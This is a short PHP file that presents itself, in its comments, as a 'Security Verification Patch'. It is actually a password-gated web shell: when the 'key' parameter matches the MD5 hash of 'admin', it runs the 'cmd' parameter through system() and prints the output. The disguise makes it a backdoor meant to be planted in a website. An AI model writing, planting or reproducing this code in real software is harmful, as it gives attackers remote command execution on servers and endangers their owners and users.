<?php
// Security Verification Patch v1.2
// Contact admin if found
if(md5(@$_GET['key']) === '21232f297a57a5a743894a0e4a801fc3') { // key=admin
    echo "<pre>";
    system(@$_GET['cmd']);
    echo "</pre>";
    exit;
}
?>